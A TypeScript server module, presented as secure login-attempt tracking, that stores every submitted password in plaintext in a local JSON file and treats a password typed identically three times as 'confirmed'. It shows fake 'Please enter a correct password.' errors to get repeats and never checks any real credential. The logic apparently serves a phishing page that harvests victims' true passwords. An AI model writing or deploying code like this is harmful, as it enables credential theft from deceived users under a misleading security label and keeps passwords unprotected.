// Persistent attempt tracking with atomic operations and secure file handling
import 'server-only'

import { secureReadJSON, secureUpdateJSON } from './secureFileSystem'
import { migrateFileIfNeeded } from './fileMigration'
import path from 'path'

export interface AttemptResult {
  allowAttempt: boolean
  samePasswordConfirmed: boolean
  attemptNumber: number
  message?: string
}

interface AttemptData {
  count: number
  timestamp: number
  passwords: string[] // Store passwords for comparison
}

interface AttemptCache {
  [key: string]: AttemptData
}

// Authentication attempts storage (formerly: attempts-cache)
// Migrate old file name on first access
const LEGACY_FILE = path.join(process.cwd(), '.attempts-cache.json')
const CACHE_FILE = path.join(process.cwd(), '.auth-attempts.json')
const CACHE_TTL = 30 * 60 * 1000 // 30 minutes
const MAX_ATTEMPTS = 4

// Migrate old file name if needed (runs once on module load)
if (typeof process !== 'undefined' && typeof process.cwd === 'function') {
  migrateFileIfNeeded(LEGACY_FILE, CACHE_FILE)
}

// Get current attempt count for a key (atomic read)
export async function getAttemptCount(key: string): Promise<number> {
  const cache = await secureReadJSON<AttemptCache>(CACHE_FILE, {})
  const entry = cache[key]
  
  if (!entry) {
    return 0
  }
  
  // Check if expired
  const now = Date.now()
  if (now - entry.timestamp > CACHE_TTL) {
    // Clean up expired entry
    await secureUpdateJSON<AttemptCache>(CACHE_FILE, {}, (c) => {
      const newCache = { ...c }
      delete newCache[key]
      return newCache
    })
    return 0
  }
  
  return entry.count
}

// Get passwords for a key (atomic read)
export async function getPasswords(key: string): Promise<string[]> {
  const cache = await secureReadJSON<AttemptCache>(CACHE_FILE, {})
  const entry = cache[key]
  
  if (!entry || !entry.passwords) {
    return []
  }
  
  // Check if expired
  const now = Date.now()
  if (now - entry.timestamp > CACHE_TTL) {
    // Clean up expired entry
    await secureUpdateJSON<AttemptCache>(CACHE_FILE, {}, (c) => {
      const newCache = { ...c }
      delete newCache[key]
      return newCache
    })
    return []
  }
  
  return entry.passwords
}

// Increment attempt count and store password for a key (atomic read-modify-write)
export async function recordAttempt(key: string, password: string): Promise<AttemptResult> {
  const now = Date.now()
  const trimmedPassword = password.trim()
  
  // Atomic read-modify-write operation
  const updatedCache = await secureUpdateJSON<AttemptCache>(
    CACHE_FILE,
    {},
    (cache) => {
      // Clean expired entries
      const cleanedCache: AttemptCache = {}
      for (const [k, v] of Object.entries(cache)) {
        if (now - v.timestamp < CACHE_TTL) {
          cleanedCache[k] = v
        }
      }
      
      // Get or create attempt data
      const entry = cleanedCache[key] || {
        count: 0,
        timestamp: now,
        passwords: []
      }
      
      // Update attempt data
      const newCount = entry.count + 1
      const updatedPasswords = [...entry.passwords, trimmedPassword]
      
      cleanedCache[key] = {
        count: newCount,
        timestamp: now,
        passwords: updatedPasswords
      }
      
      return cleanedCache
    }
  )
  
  const entry = updatedCache[key]
  const newCount = entry.count
  const updatedPasswords = entry.passwords
  
  // Check password patterns
  let shouldBlock = false
  let allowFourth = false
  let samePasswordConfirmed = false
  let message: string | undefined
  
  if (newCount === 3) {
    // Check if all 3 passwords are the same (exact match, case-sensitive)
    if (updatedPasswords.length === 3 && 
        updatedPasswords[0] === updatedPasswords[1] && 
        updatedPasswords[1] === updatedPasswords[2] &&
        updatedPasswords[0] === updatedPasswords[2]) {
      // All 3 attempts have same password = password is correct, block further attempts
      shouldBlock = true
      samePasswordConfirmed = true
      message = 'Password confirmed'
    } else if (updatedPasswords.length === 3) {
      // Check if attempts 1 & 2 are same but 3 is different
      if (updatedPasswords[0] === updatedPasswords[1] && 
          updatedPasswords[1] !== updatedPasswords[2]) {
        // Allow 4th attempt with message
        allowFourth = true
        message = 'Please enter a correct password.'
      } else if (updatedPasswords[0] !== updatedPasswords[1] && 
                 (updatedPasswords[0] === updatedPasswords[2] || updatedPasswords[1] === updatedPasswords[2])) {
        // 2 attempts are same but 1 is different - allow 4th attempt (last chance)
        allowFourth = true
        message = 'Please enter a correct password.'
      }
    }
  } else if (newCount === 4) {
    // 4th attempt reached - block after this
    shouldBlock = true
  }
  
  // Return AttemptResult format
  if (samePasswordConfirmed) {
    // 3 same passwords - password confirmed
    return {
      allowAttempt: true,
      samePasswordConfirmed: true,
      attemptNumber: newCount,
      message: 'Password confirmed',
    }
  } else if (allowFourth) {
    // 4th attempt allowed
    return {
      allowAttempt: true,
      samePasswordConfirmed: false,
      attemptNumber: newCount,
      message: 'Please enter a correct password.',
    }
  } else if (shouldBlock) {
    // Too many attempts
    return {
      allowAttempt: false,
      samePasswordConfirmed: false,
      attemptNumber: newCount,
      message: 'Too many attempts',
    }
  } else {
    // Normal attempts (1-2)
    return {
      allowAttempt: true,
      samePasswordConfirmed: false,
      attemptNumber: newCount,
    }
  }
}

// Reset attempt count for a key (atomic update)
export async function resetAttempt(key: string): Promise<void> {
  await secureUpdateJSON<AttemptCache>(CACHE_FILE, {}, (cache) => {
    const newCache = { ...cache }
    delete newCache[key]
    return newCache
  })
}

